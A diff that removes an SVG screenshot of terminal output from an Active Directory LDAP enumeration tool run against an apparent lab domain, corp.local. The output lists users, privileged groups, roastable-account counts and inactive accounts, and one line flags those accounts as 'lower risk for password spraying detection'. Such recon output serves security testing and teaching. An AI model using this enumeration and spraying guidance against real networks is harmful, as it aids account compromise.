@@ -1,516 +1,1196 @@
-<svg xmlns="http://www.w3.org/2000/svg" width="2182" height="4057" viewBox="0 0 2182 4057" font-family='ui-monospace,"Cascadia Code","Source Code Pro",Menlo,Consolas,monospace' font-size="13">
-<rect width="2182" height="4057" rx="6" fill="#0d1117"/>
-<text x="16.0" y="29.0" fill="#c9d1d9" xml:space="preserve">  ██╗     ██╗███████╗████████╗██████╗  █████╗ ██████╗ </text>
-<text x="16.0" y="46.5" fill="#c9d1d9" xml:space="preserve">  ██║     ██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗</text>
-<text x="16.0" y="64.0" fill="#c9d1d9" xml:space="preserve">  ██║     ██║███████╗   ██║   ██║  ██║███████║██████╔╝</text>
-<text x="16.0" y="81.5" fill="#c9d1d9" xml:space="preserve">  ██║     ██║╚════██║   ██║   ██║  ██║██╔══██║██╔═══╝ </text>
-<text x="16.0" y="99.0" fill="#c9d1d9" xml:space="preserve">  ███████╗██║███████║   ██║   ██████╔╝██║  ██║██║     </text>
-<text x="16.0" y="116.5" fill="#c9d1d9" xml:space="preserve">  ╚══════╝╚═╝╚══════╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝     </text>
-<text x="16.0" y="151.5" fill="#39c5cf" xml:space="preserve">[*]</text>
-<text x="39.5" y="151.5" fill="#c9d1d9" xml:space="preserve"> Connecting to 10.10.10.10:636 (LDAPS)</text>
-<text x="16.0" y="186.5" fill="#3fb950" font-weight="bold" xml:space="preserve">  ✔ Connected</text>
-<text x="16.0" y="204.0" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="204.0" fill="#39c5cf" xml:space="preserve">Target:</text>
-<text x="102.0" y="204.0" fill="#c9d1d9" xml:space="preserve">  10.10.10.10:636</text>
-<text x="16.0" y="221.5" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="221.5" fill="#39c5cf" xml:space="preserve">Auth:</text>
-<text x="86.4" y="221.5" fill="#c9d1d9" xml:space="preserve">  </text>
-<text x="102.0" y="221.5" fill="#3fb950" xml:space="preserve">Kerberos (GSSAPI)</text>
-<text x="16.0" y="239.0" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="239.0" fill="#39c5cf" xml:space="preserve">Base DN:</text>
-<text x="109.8" y="239.0" fill="#c9d1d9" xml:space="preserve">  DC=corp,DC=local</text>
-<text x="16.0" y="274.0" fill="#58a6ff" font-weight="bold" xml:space="preserve">╔════════════════════════════════════════════════════════════╗</text>
-<text x="16.0" y="291.5" fill="#58a6ff" font-weight="bold" xml:space="preserve">║                     DOMAIN INFORMATION                     ║</text>
-<text x="16.0" y="309.0" fill="#58a6ff" font-weight="bold" xml:space="preserve">╚════════════════════════════════════════════════════════════╝</text>
-<text x="16.0" y="326.5" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="326.5" fill="#39c5cf" xml:space="preserve">Domain:</text>
-<text x="102.0" y="326.5" fill="#c9d1d9" xml:space="preserve">  corp.local</text>
-<text x="16.0" y="344.0" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="344.0" fill="#39c5cf" xml:space="preserve">Base DN:</text>
-<text x="109.8" y="344.0" fill="#c9d1d9" xml:space="preserve">  DC=corp,DC=local</text>
-<text x="16.0" y="361.5" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="361.5" fill="#39c5cf" xml:space="preserve">Forest DN:</text>
-<text x="125.5" y="361.5" fill="#c9d1d9" xml:space="preserve">  DC=corp,DC=local</text>
-<text x="16.0" y="379.0" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="379.0" fill="#39c5cf" xml:space="preserve">DC Hostname:</text>
-<text x="141.1" y="379.0" fill="#c9d1d9" xml:space="preserve">  DC01.corp.local</text>
-<text x="16.0" y="396.5" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="396.5" fill="#39c5cf" xml:space="preserve">Domain Func. Level:</text>
-<text x="195.9" y="396.5" fill="#c9d1d9" xml:space="preserve">  Windows Server 2016 / 2019 / 2022</text>
-<text x="16.0" y="414.0" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="414.0" fill="#39c5cf" xml:space="preserve">Forest Func. Level:</text>
-<text x="195.9" y="414.0" fill="#c9d1d9" xml:space="preserve">  Windows Server 2016 / 2019 / 2022</text>
-<text x="16.0" y="431.5" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="431.5" fill="#39c5cf" xml:space="preserve">Auth Method:</text>
-<text x="141.1" y="431.5" fill="#c9d1d9" xml:space="preserve">  Kerberos (GSSAPI)</text>
-<text x="16.0" y="449.0" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="449.0" fill="#39c5cf" xml:space="preserve">Auth Note:</text>
-<text x="125.5" y="449.0" fill="#c9d1d9" xml:space="preserve">  TGT acquired via impacket</text>
-<text x="16.0" y="466.5" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="466.5" fill="#39c5cf" xml:space="preserve">Authenticated as:</text>
-<text x="180.2" y="466.5" fill="#c9d1d9" xml:space="preserve">  corp.local\svc_ca</text>
-<text x="16.0" y="484.0" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="484.0" fill="#39c5cf" xml:space="preserve">Domain SID:</text>
-<text x="133.3" y="484.0" fill="#c9d1d9" xml:space="preserve">  S-1-5-21-1111111111-2222222222-3333333333</text>
-<text x="16.0" y="501.5" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="501.5" fill="#39c5cf" xml:space="preserve">Domain Created:</text>
-<text x="164.6" y="501.5" fill="#c9d1d9" xml:space="preserve">  2025-09-13 16:39:42+00:00</text>
-<text x="16.0" y="536.5" fill="#39c5cf" font-weight="bold" xml:space="preserve">  ── FSMO Roles ──</text>
-<text x="16.0" y="554.0" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="554.0" fill="#39c5cf" xml:space="preserve">PDC Emulator / RID Master:</text>
-<text x="250.6" y="554.0" fill="#c9d1d9" xml:space="preserve">  DC01</text>
-<text x="16.0" y="571.5" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="571.5" fill="#39c5cf" xml:space="preserve">Infrastructure Master:</text>
-<text x="219.3" y="571.5" fill="#c9d1d9" xml:space="preserve">  DC01</text>
-<text x="16.0" y="589.0" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="589.0" fill="#39c5cf" xml:space="preserve">Schema Master:</text>
-<text x="156.8" y="589.0" fill="#c9d1d9" xml:space="preserve">  DC01</text>
-<text x="16.0" y="606.5" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="606.5" fill="#39c5cf" xml:space="preserve">Domain Naming Master:</text>
-<text x="211.5" y="606.5" fill="#c9d1d9" xml:space="preserve">  DC01</text>
-<text x="16.0" y="624.0" fill="#3fb950" xml:space="preserve">[+]</text>
-<text x="39.5" y="624.0" fill="#c9d1d9" xml:space="preserve"> MachineAccountQuota = 0  (safe)</text>
-<text x="16.0" y="659.0" fill="#39c5cf" font-weight="bold" xml:space="preserve">  ── Pre-Windows 2000 Compatible Access ──</text>
-<text x="16.0" y="676.5" fill="#39c5cf" xml:space="preserve">[*]</text>
-<text x="39.5" y="676.5" fill="#c9d1d9" xml:space="preserve"> 2 member(s) in Pre-Windows 2000 Compatible Access group</text>
-<text x="16.0" y="711.5" fill="#58a6ff" font-weight="bold" xml:space="preserve">╔════════════════════════════════════════════════════════════╗</text>
-<text x="16.0" y="729.0" fill="#58a6ff" font-weight="bold" xml:space="preserve">║                           USERS                            ║</text>
-<text x="16.0" y="746.5" fill="#58a6ff" font-weight="bold" xml:space="preserve">╚════════════════════════════════════════════════════════════╝</text>
-<text x="16.0" y="764.0" fill="#39c5cf" xml:space="preserve">[*]</text>
-<text x="39.5" y="764.0" fill="#c9d1d9" xml:space="preserve"> </text>
-<text x="47.3" y="764.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Users</text>
-<text x="86.4" y="764.0" fill="#c9d1d9" xml:space="preserve">: </text>
-<text x="102.0" y="764.0" fill="#f0f6fc" font-weight="bold" xml:space="preserve">11</text>
-<text x="117.7" y="764.0" fill="#c9d1d9" xml:space="preserve"> total | </text>
-<text x="188.0" y="764.0" fill="#d29922" xml:space="preserve">2</text>
-<text x="195.9" y="764.0" fill="#c9d1d9" xml:space="preserve"> disabled | </text>
-<text x="289.7" y="764.0" fill="#6e7681" xml:space="preserve">0</text>
-<text x="297.5" y="764.0" fill="#c9d1d9" xml:space="preserve"> locked | </text>
-<text x="375.7" y="764.0" fill="#6e7681" xml:space="preserve">0</text>
-<text x="383.5" y="764.0" fill="#c9d1d9" xml:space="preserve"> AS-REP roastable | </text>
-<text x="539.9" y="764.0" fill="#6e7681" xml:space="preserve">0</text>
-<text x="547.8" y="764.0" fill="#c9d1d9" xml:space="preserve"> Kerberoastable | </text>
-<text x="688.5" y="764.0" fill="#d29922" xml:space="preserve">1</text>
-<text x="696.3" y="764.0" fill="#c9d1d9" xml:space="preserve"> passwd_notreqd | </text>
-<text x="837.1" y="764.0" fill="#6e7681" xml:space="preserve">0</text>
-<text x="844.9" y="764.0" fill="#c9d1d9" xml:space="preserve"> shadow creds | </text>
-<text x="970.0" y="764.0" fill="#d29922" xml:space="preserve">2</text>
-<text x="977.9" y="764.0" fill="#c9d1d9" xml:space="preserve"> adminCount=1</text>
-<text x="16.0" y="799.0" fill="#39c5cf" font-weight="bold" xml:space="preserve">  ── Privileged Users ──</text>
-<text x="16.0" y="816.5" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="816.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Username     </text>
-<text x="148.9" y="816.5" fill="#c9d1d9" xml:space="preserve">  </text>
-<text x="164.6" y="816.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Privileged Groups                                                                           </text>
-<text x="884.0" y="816.5" fill="#c9d1d9" xml:space="preserve">  </text>
-<text x="899.7" y="816.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Last Logon</text>
-<text x="977.9" y="816.5" fill="#c9d1d9" xml:space="preserve">  </text>
-<text x="993.5" y="816.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Description                                           </text>
-<text x="16.0" y="834.0" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="834.0" fill="#c9d1d9" opacity="0.65" xml:space="preserve">─────────────  ────────────────────────────────────────────────────────────────────────────────────────────  ──────────  ──────────────────────────────────────────────────────</text>
-<text x="16.0" y="851.5" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="851.5" fill="#ff7b72" xml:space="preserve">Administrator  Group Policy Creator Owners, Domain Admins, Enterprise Admins, Schema Admins, Administrators  unknown     Built-in account for administering the computer/domain</text>
-<text x="16.0" y="886.5" fill="#39c5cf" font-weight="bold" xml:space="preserve">  ── PASSWD_NOTREQD (may have empty password) ──</text>
-<text x="16.0" y="904.0" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="904.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Username</text>
-<text x="109.8" y="904.0" fill="#c9d1d9" xml:space="preserve">  </text>
-<text x="125.5" y="904.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">UAC Flags                              </text>
-<text x="430.5" y="904.0" fill="#c9d1d9" xml:space="preserve">  </text>
-<text x="446.1" y="904.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Description                                             </text>
-<text x="16.0" y="921.5" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="921.5" fill="#c9d1d9" opacity="0.65" xml:space="preserve">────────  ───────────────────────────────────────  ────────────────────────────────────────────────────────</text>
-<text x="16.0" y="939.0" fill="#c9d1d9" xml:space="preserve">    Guest     DISABLED, PASSWD_NOTREQD, NO_EXPIRE_PWD  Built-in account for guest access to the computer/domain</text>
-<text x="16.0" y="974.0" fill="#39c5cf" font-weight="bold" xml:space="preserve">  ── Inactive / Never Logged-in (&gt;90 days) ──</text>
-<text x="16.0" y="991.5" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="991.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Username  </text>
-<text x="125.5" y="991.5" fill="#c9d1d9" xml:space="preserve">  </text>
-<text x="141.1" y="991.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Last Logon</text>
-<text x="219.3" y="991.5" fill="#c9d1d9" xml:space="preserve">  </text>
-<text x="235.0" y="991.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Flags                                  </text>
-<text x="539.9" y="991.5" fill="#c9d1d9" xml:space="preserve">  </text>
-<text x="555.6" y="991.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Description                                             </text>
-<text x="16.0" y="1009.0" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="1009.0" fill="#c9d1d9" opacity="0.65" xml:space="preserve">──────────  ──────────  ───────────────────────────────────────  ────────────────────────────────────────────────────────</text>
-<text x="16.0" y="1026.5" fill="#c9d1d9" xml:space="preserve">    Guest       never       DISABLED, PASSWD_NOTREQD, NO_EXPIRE_PWD  Built-in account for guest access to the computer/domain</text>
-<text x="16.0" y="1044.0" fill="#c9d1d9" xml:space="preserve">    krbtgt      never       DISABLED                                 </text>
-<text x="555.6" y="1044.0" fill="#d29922" xml:space="preserve">Key Distribution Center Service Account</text>
-<text x="860.6" y="1044.0" fill="#c9d1d9" xml:space="preserve">                 </text>
-<text x="16.0" y="1061.5" fill="#c9d1d9" xml:space="preserve">    j.crickets  never       NO_EXPIRE_PWD                                                                                    </text>
-<text x="16.0" y="1079.0" fill="#c9d1d9" xml:space="preserve">    e.blanch    never       NO_EXPIRE_PWD                                                                                    </text>
-<text x="16.0" y="1096.5" fill="#c9d1d9" xml:space="preserve">    j.johnson   never       NO_EXPIRE_PWD                                                                                    </text>
-<text x="16.0" y="1114.0" fill="#c9d1d9" xml:space="preserve">    svc_web     never       NO_EXPIRE_PWD                            Web Server in Progress                                  </text>
-<text x="16.0" y="1131.5" fill="#39c5cf" xml:space="preserve">[*]</text>
-<text x="39.5" y="1131.5" fill="#c9d1d9" xml:space="preserve"> 6 inactive/never-logged account(s) — lower risk for password spraying detection</text>
-<text x="16.0" y="1166.5" fill="#39c5cf" font-weight="bold" xml:space="preserve">  ── AdminSDHolder Protected (adminCount=1) ──</text>
-<text x="16.0" y="1184.0" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="1184.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Username     </text>
-<text x="148.9" y="1184.0" fill="#c9d1d9" xml:space="preserve">  </text>
-<text x="164.6" y="1184.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">UAC Flags    </text>
-<text x="266.2" y="1184.0" fill="#c9d1d9" xml:space="preserve">  </text>
-<text x="281.9" y="1184.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Description                                           </text>
-<text x="16.0" y="1201.5" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="1201.5" fill="#c9d1d9" opacity="0.65" xml:space="preserve">─────────────  ─────────────  ──────────────────────────────────────────────────────</text>
-<text x="16.0" y="1219.0" fill="#c9d1d9" xml:space="preserve">    Administrator  NO_EXPIRE_PWD  Built-in account for administering the computer/domain</text>
-<text x="16.0" y="1236.5" fill="#c9d1d9" xml:space="preserve">    krbtgt         DISABLED       </text>
-<text x="281.9" y="1236.5" fill="#d29922" xml:space="preserve">Key Distribution Center Service Account</text>
-<text x="586.9" y="1236.5" fill="#c9d1d9" xml:space="preserve">               </text>
-<text x="16.0" y="1271.5" fill="#39c5cf" font-weight="bold" xml:space="preserve">  ── All Users ──</text>
-<text x="16.0" y="1289.0" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="1289.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Username     </text>
-<text x="148.9" y="1289.0" fill="#c9d1d9" xml:space="preserve">  </text>
-<text x="164.6" y="1289.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Last Logon</text>
-<text x="242.8" y="1289.0" fill="#c9d1d9" xml:space="preserve">  </text>
-<text x="258.4" y="1289.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Flags                                  </text>
-<text x="563.4" y="1289.0" fill="#c9d1d9" xml:space="preserve">  </text>
-<text x="579.0" y="1289.0" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Description                                             </text>
-<text x="16.0" y="1306.5" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="1306.5" fill="#c9d1d9" opacity="0.65" xml:space="preserve">─────────────  ──────────  ───────────────────────────────────────  ────────────────────────────────────────────────────────</text>
-<text x="16.0" y="1324.0" fill="#c9d1d9" xml:space="preserve">    Administrator  unknown     NO_EXPIRE_PWD                            Built-in account for administering the computer/domain  </text>
-<text x="16.0" y="1341.5" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="1341.5" fill="#ff7b72" xml:space="preserve">Guest          never       DISABLED, PASSWD_NOTREQD, NO_EXPIRE_PWD  Built-in account for guest access to the computer/domain</text>
-<text x="16.0" y="1359.0" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="1359.0" fill="#ff7b72" xml:space="preserve">krbtgt         never       DISABLED                                 </text>
-<text x="579.0" y="1359.0" fill="#d29922" xml:space="preserve">Key Distribution Center Service Account</text>
-<text x="884.0" y="1359.0" fill="#c9d1d9" xml:space="preserve">                 </text>
-<text x="16.0" y="1376.5" fill="#c9d1d9" xml:space="preserve">    e.hills        unknown     NO_EXPIRE_PWD                                                                                    </text>
-<text x="16.0" y="1394.0" fill="#c9d1d9" xml:space="preserve">    j.crickets     never       NO_EXPIRE_PWD                                                                                    </text>
-<text x="16.0" y="1411.5" fill="#c9d1d9" xml:space="preserve">    e.blanch       never       NO_EXPIRE_PWD                                                                                    </text>
-<text x="16.0" y="1429.0" fill="#c9d1d9" xml:space="preserve">    i.park         unknown     NO_EXPIRE_PWD                            IT Intern                                               </text>
-<text x="16.0" y="1446.5" fill="#c9d1d9" xml:space="preserve">    j.johnson      never       NO_EXPIRE_PWD                                                                                    </text>
-<text x="16.0" y="1464.0" fill="#c9d1d9" xml:space="preserve">    a.harris       unknown     NO_EXPIRE_PWD                                                                                    </text>
-<text x="16.0" y="1481.5" fill="#c9d1d9" xml:space="preserve">    svc_ca         unknown     NO_EXPIRE_PWD                                                                                    </text>
-<text x="16.0" y="1499.0" fill="#c9d1d9" xml:space="preserve">    svc_web        never       NO_EXPIRE_PWD                            Web Server in Progress                                  </text>
-<text x="16.0" y="1534.0" fill="#58a6ff" font-weight="bold" xml:space="preserve">╔════════════════════════════════════════════════════════════╗</text>
-<text x="16.0" y="1551.5" fill="#58a6ff" font-weight="bold" xml:space="preserve">║                           GROUPS                           ║</text>
-<text x="16.0" y="1569.0" fill="#58a6ff" font-weight="bold" xml:space="preserve">╚════════════════════════════════════════════════════════════╝</text>
-<text x="16.0" y="1586.5" fill="#39c5cf" xml:space="preserve">[*]</text>
-<text x="39.5" y="1586.5" fill="#c9d1d9" xml:space="preserve"> </text>
-<text x="47.3" y="1586.5" fill="#c9d1d9" font-weight="bold" xml:space="preserve">Groups</text>
-<text x="94.2" y="1586.5" fill="#c9d1d9" xml:space="preserve">: </text>
-<text x="109.8" y="1586.5" fill="#f0f6fc" font-weight="bold" xml:space="preserve">51</text>
-<text x="125.5" y="1586.5" fill="#c9d1d9" xml:space="preserve"> total | </text>
-<text x="195.9" y="1586.5" fill="#d29922" xml:space="preserve">17</text>
-<text x="211.5" y="1586.5" fill="#c9d1d9" xml:space="preserve"> high-value</text>
-<text x="16.0" y="1621.5" fill="#39c5cf" font-weight="bold" xml:space="preserve">  ── High-Value Groups ──</text>
-<text x="16.0" y="1639.0" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="1639.0" fill="#d29922" font-weight="bold" xml:space="preserve">Administrators</text>
-<text x="156.8" y="1639.0" fill="#c9d1d9" xml:space="preserve">  [Domain Local Security]  3 member(s)  — </text>
-<text x="485.2" y="1639.0" fill="#c9d1d9" opacity="0.65" xml:space="preserve">Administrators have complete and unrestricted access to the computer/domain</text>
-<text x="16.0" y="1656.5" fill="#c9d1d9" xml:space="preserve">        </text>
-<text x="78.6" y="1656.5" fill="#39c5cf" xml:space="preserve">•</text>
-<text x="86.4" y="1656.5" fill="#c9d1d9" xml:space="preserve"> Domain Admins  </text>
-<text x="211.5" y="1656.5" fill="#6e7681" xml:space="preserve">(CN=Domain Admins,OU=Groups,DC=corp,DC=local)</text>
-<text x="16.0" y="1674.0" fill="#c9d1d9" xml:space="preserve">        </text>
-<text x="78.6" y="1674.0" fill="#39c5cf" xml:space="preserve">•</text>
-<text x="86.4" y="1674.0" fill="#c9d1d9" xml:space="preserve"> Enterprise Admins  </text>
-<text x="242.8" y="1674.0" fill="#6e7681" xml:space="preserve">(CN=Enterprise Admins,OU=Groups,DC=corp,DC=local)</text>
-<text x="16.0" y="1691.5" fill="#c9d1d9" xml:space="preserve">        </text>
-<text x="78.6" y="1691.5" fill="#39c5cf" xml:space="preserve">•</text>
-<text x="86.4" y="1691.5" fill="#c9d1d9" xml:space="preserve"> Administrator  </text>
-<text x="211.5" y="1691.5" fill="#6e7681" xml:space="preserve">(CN=Administrator,CN=Users,DC=corp,DC=local)</text>
-<text x="16.0" y="1709.0" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="1709.0" fill="#d29922" font-weight="bold" xml:space="preserve">Print Operators</text>
-<text x="164.6" y="1709.0" fill="#c9d1d9" xml:space="preserve">  [Domain Local Security]  0 member(s)  — </text>
-<text x="493.0" y="1709.0" fill="#c9d1d9" opacity="0.65" xml:space="preserve">Members can administer printers installed on domain controllers</text>
-<text x="16.0" y="1726.5" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="1726.5" fill="#d29922" font-weight="bold" xml:space="preserve">Backup Operators</text>
-<text x="172.4" y="1726.5" fill="#c9d1d9" xml:space="preserve">  [Domain Local Security]  0 member(s)  — </text>
-<text x="500.8" y="1726.5" fill="#c9d1d9" opacity="0.65" xml:space="preserve">Backup Operators can override security restrictions for the sole purpose of backing up or restoring files</text>
-<text x="16.0" y="1744.0" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="1744.0" fill="#d29922" font-weight="bold" xml:space="preserve">Remote Desktop Users</text>
-<text x="203.7" y="1744.0" fill="#c9d1d9" xml:space="preserve">  [Domain Local Security]  0 member(s)  — </text>
-<text x="532.1" y="1744.0" fill="#c9d1d9" opacity="0.65" xml:space="preserve">Members in this group are granted the right to logon remotely</text>
-<text x="16.0" y="1761.5" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="1761.5" fill="#d29922" font-weight="bold" xml:space="preserve">Hyper-V Administrators</text>
-<text x="219.3" y="1761.5" fill="#c9d1d9" xml:space="preserve">  [Domain Local Security]  0 member(s)  — </text>
-<text x="547.8" y="1761.5" fill="#c9d1d9" opacity="0.65" xml:space="preserve">Members of this group have complete and unrestricted access to all features of Hyper-V.</text>
-<text x="16.0" y="1779.0" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="1779.0" fill="#d29922" font-weight="bold" xml:space="preserve">Remote Management Users</text>
-<text x="227.1" y="1779.0" fill="#c9d1d9" xml:space="preserve">  [Domain Local Security]  1 member(s)  — </text>
-<text x="555.6" y="1779.0" fill="#c9d1d9" opacity="0.65" xml:space="preserve">Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.</text>
-<text x="16.0" y="1796.5" fill="#c9d1d9" xml:space="preserve">        </text>
-<text x="78.6" y="1796.5" fill="#39c5cf" xml:space="preserve">•</text>
-<text x="86.4" y="1796.5" fill="#c9d1d9" xml:space="preserve"> Alice Harris  </text>
-<text x="203.7" y="1796.5" fill="#6e7681" xml:space="preserve">(CN=Alice Harris,CN=Users,DC=corp,DC=local)</text>
-<text x="16.0" y="1814.0" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="1814.0" fill="#d29922" font-weight="bold" xml:space="preserve">Storage Replica Administrators</text>
-<text x="281.9" y="1814.0" fill="#c9d1d9" xml:space="preserve">  [Domain Local Security]  0 member(s)  — </text>
-<text x="610.3" y="1814.0" fill="#c9d1d9" opacity="0.65" xml:space="preserve">Members of this group have complete and unrestricted access to all features of Storage Replica.</text>
-<text x="16.0" y="1831.5" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="1831.5" fill="#d29922" font-weight="bold" xml:space="preserve">Schema Admins</text>
-<text x="148.9" y="1831.5" fill="#c9d1d9" xml:space="preserve">  [Universal Security]  1 member(s)  — </text>
-<text x="453.9" y="1831.5" fill="#c9d1d9" opacity="0.65" xml:space="preserve">Designated administrators of the schema</text>
-<text x="16.0" y="1849.0" fill="#c9d1d9" xml:space="preserve">        </text>
-<text x="78.6" y="1849.0" fill="#39c5cf" xml:space="preserve">•</text>
-<text x="86.4" y="1849.0" fill="#c9d1d9" xml:space="preserve"> Administrator  </text>
-<text x="211.5" y="1849.0" fill="#6e7681" xml:space="preserve">(CN=Administrator,CN=Users,DC=corp,DC=local)</text>
-<text x="16.0" y="1866.5" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="1866.5" fill="#d29922" font-weight="bold" xml:space="preserve">Enterprise Admins</text>
-<text x="180.2" y="1866.5" fill="#c9d1d9" xml:space="preserve">  [Universal Security]  1 member(s)  — </text>
-<text x="485.2" y="1866.5" fill="#c9d1d9" opacity="0.65" xml:space="preserve">Designated administrators of the enterprise</text>
-<text x="16.0" y="1884.0" fill="#c9d1d9" xml:space="preserve">        </text>
-<text x="78.6" y="1884.0" fill="#39c5cf" xml:space="preserve">•</text>
-<text x="86.4" y="1884.0" fill="#c9d1d9" xml:space="preserve"> Administrator  </text>
-<text x="211.5" y="1884.0" fill="#6e7681" xml:space="preserve">(CN=Administrator,CN=Users,DC=corp,DC=local)</text>
-<text x="16.0" y="1901.5" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="1901.5" fill="#d29922" font-weight="bold" xml:space="preserve">Domain Admins</text>
-<text x="148.9" y="1901.5" fill="#c9d1d9" xml:space="preserve">  [Global Security]  1 member(s)  — </text>
-<text x="430.5" y="1901.5" fill="#c9d1d9" opacity="0.65" xml:space="preserve">Designated administrators of the domain</text>
-<text x="16.0" y="1919.0" fill="#c9d1d9" xml:space="preserve">        </text>
-<text x="78.6" y="1919.0" fill="#39c5cf" xml:space="preserve">•</text>
-<text x="86.4" y="1919.0" fill="#c9d1d9" xml:space="preserve"> Administrator  </text>
-<text x="211.5" y="1919.0" fill="#6e7681" xml:space="preserve">(CN=Administrator,CN=Users,DC=corp,DC=local)</text>
-<text x="16.0" y="1936.5" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="1936.5" fill="#d29922" font-weight="bold" xml:space="preserve">Group Policy Creator Owners</text>
-<text x="258.4" y="1936.5" fill="#c9d1d9" xml:space="preserve">  [Global Security]  1 member(s)  — </text>
-<text x="539.9" y="1936.5" fill="#c9d1d9" opacity="0.65" xml:space="preserve">Members in this group can modify group policy for the domain</text>
-<text x="16.0" y="1954.0" fill="#c9d1d9" xml:space="preserve">        </text>
-<text x="78.6" y="1954.0" fill="#39c5cf" xml:space="preserve">•</text>
-<text x="86.4" y="1954.0" fill="#c9d1d9" xml:space="preserve"> Administrator  </text>
-<text x="211.5" y="1954.0" fill="#6e7681" xml:space="preserve">(CN=Administrator,CN=Users,DC=corp,DC=local)</text>
-<text x="16.0" y="1971.5" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="1971.5" fill="#d29922" font-weight="bold" xml:space="preserve">Server Operators</text>
-<text x="172.4" y="1971.5" fill="#c9d1d9" xml:space="preserve">  [Domain Local Security]  0 member(s)  — </text>
-<text x="500.8" y="1971.5" fill="#c9d1d9" opacity="0.65" xml:space="preserve">Members can administer domain servers</text>
-<text x="16.0" y="1989.0" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="1989.0" fill="#d29922" font-weight="bold" xml:space="preserve">Account Operators</text>
-<text x="180.2" y="1989.0" fill="#c9d1d9" xml:space="preserve">  [Domain Local Security]  0 member(s)  — </text>
-<text x="508.7" y="1989.0" fill="#c9d1d9" opacity="0.65" xml:space="preserve">Members can administer domain user and group accounts</text>
-<text x="16.0" y="2006.5" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="2006.5" fill="#d29922" font-weight="bold" xml:space="preserve">Protected Users</text>
-<text x="164.6" y="2006.5" fill="#c9d1d9" xml:space="preserve">  [Global Security]  0 member(s)  — </text>
-<text x="446.1" y="2006.5" fill="#c9d1d9" opacity="0.65" xml:space="preserve">Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.</text>
-<text x="16.0" y="2024.0" fill="#c9d1d9" xml:space="preserve">    </text>
-<text x="47.3" y="2024.0" fill="#d29922" font-weight="bold" xml:space="preserve">Key Admins</text>
-<text x="125.5" y="2024.0" fill="#c9d1d9" xml:space="preserve">  [Global Security]  0 member(s)  — </text>
-<text x="407.0" y="2024.0" fill="#c9d1d9" opacity="0.65" xml:space="preserve">Members of this group can perform administrative actions on key objects within the domain.</text>
-<text x="16.0" y="2041.5" fill="#c9d1d9" xml:space="preserve">    </text>
